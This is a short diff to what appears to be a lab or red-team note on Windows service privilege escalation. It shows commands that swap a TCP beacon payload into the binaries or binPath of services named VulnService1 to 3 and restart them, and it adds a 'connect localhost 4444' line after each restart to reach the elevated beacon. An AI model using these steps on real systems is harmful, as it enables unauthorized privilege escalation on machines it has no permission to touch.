@@ -43,6 +43,7 @@ mv tcp-local_x64.svc.exe Service.exe
 ls
 run sc stop VulnService1
 run sc start VulnService1
+connect localhost 4444
 ```
 
 
@@ -71,6 +72,7 @@ run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
 run sc qc VulnService2
 run sc stop VulnService2
 run sc start VulnService2
+connect localhost 4444
 ```
 
 
@@ -84,6 +86,7 @@ copy "tcp-local_x64.svc.exe" "Service 3.exe"
 run sc stop VulnService3
 upload C:\Payload\Service 3.exe
 run sc start VulnService3
+connect localhost 4444
 ```
 
 ## UAC Bypasses
